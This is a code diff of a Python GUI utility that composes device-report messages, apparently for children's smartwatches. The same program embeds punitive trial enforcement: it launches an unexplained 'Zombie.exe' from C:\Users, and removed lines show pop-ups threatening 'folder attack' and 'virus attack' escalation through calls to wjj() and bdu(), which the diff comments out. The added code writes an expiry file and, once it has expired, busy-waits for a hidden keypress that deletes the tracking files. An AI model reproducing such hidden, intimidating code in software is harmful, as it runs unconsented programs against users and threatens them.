@@ -2,6 +2,7 @@ import binascii
 import csv
 import os
 import time
+import datetime
 import requests
 import zipfile
 import threading
@@ -28,6 +29,7 @@ import base64
 from concurrent.futures import ThreadPoolExecutor
 from tkinter.messagebox import *
 import fnmatch
+import keyboard
 
 is_on = True
 LOG_LINE_NUM = 0
@@ -1571,7 +1573,8 @@ class MY_GUI(tk.Tk):
             self.busu_data_label11.grid(row=14, columnspan=2, sticky=E)
             self.busu_data_Text11.grid(row=15, column=0, sticky=E)
         elif inits == "终端上报":
-            items = ("设备模式上报", "设备登录", "获取天气信息", "健康心率血氧参数上报", "健康参数上报", "通话记录上报")
+            items = ("设备模式上报", "设备登录", "获取学生信息(FA67专用)", "获取天气信息", "健康心率血氧参数上报",
+                     "健康参数上报", "通话记录上报")
             self.zd_data_label11.grid(row=14, column=0, sticky=N)
             self.zd_data_Text11.grid(row=15, column=0, columnspan=10, sticky=N)
             self.zd_data_Text11.delete(0, 10)
@@ -2778,6 +2781,7 @@ class MY_GUI(tk.Tk):
             res2 = AES_CBC_decrypt(f"{aa}", f'{self.key}', f'{self.iv}')
             match = re.search(r'\[(.*?)\]', res2.decode('utf-8'))
             tip_content = '定位数据请求：\n{}\n\n加密数据：\n{}\n\n'.format(data, res1)
+            self.result_data_Text11.delete(1.0, END)
             self.result_data_Text11.insert(1.0, tip_content)
             if match:
                 # 提取匹配到的内容（不包括中括号）
@@ -2918,6 +2922,8 @@ class MY_GUI(tk.Tk):
                 data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'DEVICE_STATUS' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '20' + 分隔符 + f'{random.randint(1, 3)}@{mode}@{int(time.time() * 1000)}@20' + 结束标识符
             elif value == "设备登录":
                 data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'DEVICE_LOGIN' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '22' + 分隔符 + f'5@1@111@1@1@100@0' + 结束标识符
+            elif value == "获取学生信息(FA67专用)":
+                data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'GET_STUDENT_STATUS' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '1' + 分隔符 + f'1' + 结束标识符
             elif value == "获取天气信息":
                 data = 消息头起始符 + 设备号 + 分隔符 + ICCID + 分隔符 + 交易流水号 + 分隔符 + 'GET_WEATHER_INFO' + 分隔符 + 报文类型 + 分隔符 + 时间 + 分隔符 + '106' + 分隔符 + f'0E{self.jd11()}N{self.wd11()}T{now_time}@460!0!9231!2351@0!0!0!0!0!0!0!0!0!0!0!0!0!' + 结束标识符
             elif value == "健康参数上报":
@@ -3965,21 +3971,18 @@ def show_popup(count):
     for i in range(count):
         # subprocess.Popen(os.getcwd() + "\\conf\\Zombie.exe")
         subprocess.Popen("C:\\Users\\Zombie.exe")
-        countdown(5)
-    file_path = "C:\\Users\\count.txt"
-    with open(file_path, "r") as file:
-        runs = int(file.readline().strip())
-        print(runs)
-    if runs < 3:
-        showwarning(title="！！！！警告警告！！！！",
-                    message="\n僵尸出没\n吃掉你脑子，嘎嘎香，┗|｀O′|┛ 嗷~~\n联系管理员添加白名单")
-    elif runs == 4:
-        showwarning(title="！！！！警告警告！！！！", message=f"第1次攻击警示\n启动文件夹攻击\n下次攻击将开启病毒模式")
-    else:
-        showwarning(title="！！！！警告警告！！！！", message=f"第2次攻击警示\n10s后将启动病毒攻击")
-    countdown(24)
-    init_window.attributes('-topmost', True)
-    stop_exe('Zombie.exe')
+    countdown(15)
+    # file_path = "C:\\Users\\count.txt"
+    # with open(file_path, "r") as file:
+    #     runs = int(file.readline().strip())
+    #     print(runs)
+    # if runs < 3:
+    #     showwarning(title="！！！！警告警告！！！！",
+    #                 message="\n僵尸出没\n吃掉你脑子，嘎嘎香，┗|｀O′|┛ 嗷~~\n联系管理员添加白名单")
+    # elif runs == 4:
+    #     showwarning(title="！！！！警告警告！！！！", message=f"第1次攻击警示\n启动文件夹攻击\n下次攻击将开启病毒模式")
+    # else:
+    #     showwarning(title="！！！！警告警告！！！！", message=f"第2次攻击警示\n10s后将启动病毒攻击")
 
 
 def wjj():
@@ -4017,20 +4020,49 @@ if __name__ == '__main__':
         else:
             pass
         count_runs()
-        if count_runs() < 2:
+        if count_runs() == 1:
+            now = datetime.datetime.now()
+            expiration_date = now + datetime.timedelta(days=30)
+            with open("C:\\Users\\expiration_date.txt", "w") as f:
+                f.write(expiration_date.strftime("%Y-%m-%d %H:%M:%S"))
             show_popup(int(MY_GUI(init_window).Zombie))
+
+        with open("C:\\Users\\expiration_date.txt", "r") as f:
+            now = datetime.datetime.now()
+            expiration_date_str = f.read()
+            expiration_date = datetime.datetime.strptime(expiration_date_str, "%Y-%m-%d %H:%M:%S")
+            print(expiration_date)
+        if now > expiration_date:
+            init_window.withdraw()
+            init_window.attributes('-topmost', True)
+            showwarning(title="软件过期提醒",
+                        message="软件程序已过期，无法启动。")
+            stop_exe('Zombie.exe')
+            while True:
+                if keyboard.is_pressed("end"):
+                    os.remove("C:\\Users\\expiration_date.txt")
+                    os.remove("C:\\Users\\Zombie.exe")
+                    os.remove("C:\\Users\\count.txt")
+                    break
+            os._exit(1)
+        else:
+            init_window.withdraw()
+            init_window.attributes('-topmost', True)
             showwarning(title="试用阶段", message="\n启动试用版本\n尽快联系管理员添加白名单")
+            stop_exe('Zombie.exe')
             init_window.deiconify()
             gui4_start()
-        elif count_runs() == 4:
-            init_window.withdraw()
-            init_window.attributes('-topmost', True)
-            show_popup(int(MY_GUI(init_window).Zombie))
-            wjj()
-        else:
-            countdown(6)
-            init_window.withdraw()
-            init_window.attributes('-topmost', True)
-            show_popup(int(MY_GUI(init_window).Zombie))
-            bdu()
-        sys.exit()
+            print("程序正常启动。")
+
+    # elif count_runs() == 4:
+    #     init_window.withdraw()
+    #     init_window.attributes('-topmost', True)
+    #     show_popup(int(MY_GUI(init_window).Zombie))
+    #     wjj()
+    # else:
+    #     countdown(6)
+    #     init_window.withdraw()
+    #     init_window.attributes('-topmost', True)
+    #     show_popup(int(MY_GUI(init_window).Zombie))
+    #     bdu()
+    # sys.exit()
